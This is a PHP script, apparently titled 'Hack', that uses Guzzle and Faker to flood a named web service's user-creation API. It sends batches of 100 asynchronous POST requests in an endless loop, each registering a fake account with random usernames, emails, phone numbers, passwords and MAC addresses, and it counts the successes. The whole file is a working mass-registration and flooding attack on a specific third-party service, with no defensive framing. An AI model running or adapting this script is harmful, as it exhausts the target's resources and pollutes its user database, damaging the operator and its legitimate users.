<?php namespace Hack;

include __DIR__ . '/vendor/autoload.php';

use GuzzleHttp\Exception\RequestException;
use GuzzleHttp\Client;
use function GuzzleHttp\Promise\settle;
use Faker;
use Carbon\Carbon;
use Psr\Http\Message\ResponseInterface;

class Hack {
	public $client;
	public $faker;
	public $url = 'https://www.connectmy.net/api/user_create';
	public $count = 0;
	public $promises;

	function __construct() {
		$this->client = new Client( [
			'timeout' => 3600,
		] );
		$this->faker  = Faker\Factory::create();
	}

	public function build( $times = 5 ) {
		for ( $i = 0; $i < $times; $i ++ ) {
			$promise = $this->client->requestAsync( 'POST', $this->url, [
				'form_params' => $this->getOptions(),
			] );
			$promise->then(
				function ( ResponseInterface $response ) {
					try {
						$response = json_decode( $response->getBody(), true );
						if ( (bool) $response['user_create']['ok'] === true ) {
							echo Carbon::now()->toCookieString() . ' Success. Count: ' . self::human_number( ++ $this->count, 4 ) . PHP_EOL;
						}
					} catch ( \Exception $e ) {
						echo Carbon::now()->toCookieString() . ' Error. Count: ' . $e->getMessage() . PHP_EOL;
					}
				},
				function ( RequestException $e ) {
					echo Carbon::now()->toCookieString() . ' Error. Count: ' . $e->getMessage() . PHP_EOL;
				}
			);
			$this->promises[] = $promise;
		}
	}

	public function fire() {
		settle( $this->promises )->wait();
	}

	public function getOptions() {
		$faker = Faker\Factory::create();

		return [
			'id'              => '',
			'UserName'        => $faker->userName . '_' . md5( microtime() ),
			'Name'            => $faker->name,
			'Mail'            => md5( microtime() ) . '@' . $faker->safeEmailDomain,
			'Mobile'          => '04' . $faker->numberBetween( 10000000, 99999999 ),
			'Password'        => $faker->password,
			'Room'            => $faker->numberBetween( 1, 999 ),
			'AllowSmsNotices' => $faker->boolean ? 'Yes' : 'No',
			'SignUpMAC'       => strtoupper( $faker->macAddress ),
			'pwquestion'      => $faker->sentence,
			'pwanswer'        => $faker->sentence,
			'termsRead'       => 'true',
		];
	}

	public static function human_number( $bytes, $decimals = 2 ) {
		$size   = array( '', 'k', 'M', 'G', 'T', 'P', 'E', 'Z', 'Y' );
		$factor = floor( ( strlen( $bytes ) - 1 ) / 3 );

		return sprintf( "%.{$decimals}f", $bytes / pow( 1024, $factor ) ) . @$size[ $factor ];
	}
}

$hack = new Hack();
while ( 1 ) {
	$hack->build( 100 );
	$hack->fire();
}
